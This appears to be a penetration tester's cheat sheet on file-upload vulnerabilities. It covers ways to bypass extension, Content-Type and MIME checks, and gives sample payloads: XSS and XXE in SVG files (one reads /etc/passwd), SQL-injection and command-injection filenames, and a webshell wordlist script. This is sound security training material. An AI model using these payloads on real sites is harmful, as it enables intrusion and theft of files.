Vulnerabilities that come when the website allows us to upload files.
* Try uploading webshells from [[Shells]].
* Bypass client validation:
	* Using burp to intercept and modify request.
		* Change file name or file extension or file location in the request.
		* Change Content-Type header in HTTP request.
	* Modify the frontend page using firefox inspector tool.
* Bypassing blacklist/whitelist extension checks:
	* Fuzz various extensions with wordlists.
	* Fuzz with double extensions, reverse extensions.
	* Fuzz with special characters: `%20, %0a, %00, %0d0a, /, .\, ., …, :`
	* Wordlists with ffuff:
		* https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt
		* https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst
		* https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Extension%20ASP
	* Files with various extensions containing webshell code in various languages: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files
	* Simple bash script to create wordlists with various extensions, character injections:
```bash
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps'; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done
```
* Bypass Content-Type header fuzzing using [Content-Type Wordlist](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt) to check allowed content types.
* Bypass MIME checks:
	* For images: Prepend `GIF8` or `GIF7A` to top of file. 
* Use phar, zip wrappers in [[File inclusion]] if target is also vulnerable to LFI.
* XSS into image metadata comment for file upload: `exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg`
* XSS into filename in file upload: `<script>alert(window.origin);</script>`
* XSS in svg file for file upload: 
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">alert(window.origin);</script>
</svg>
```
* XXE in svg file to read system files: 
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```
* XXE in svg file to read php source code: 
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=<filename>.php"> ]>
<svg>&xxe;</svg>
```
* Can file upload into DoS attack with archive decompression bomb, pixel flood.
* File upload SQL injection in filename field: `file';select+sleep(5);--.jpg`
* If file upload is vulnerable to directory traversal such as with file name. Can overwrite files in another directory.
* File upload into OS command injection: Change file name into `file$(whoami).jpg` or ``file`whoami`.jpg`` or `file.jpg||whoami` etc to inject commands.
* [Hacktricks File upload](https://book.hacktricks.xyz/pentesting-web/file-upload)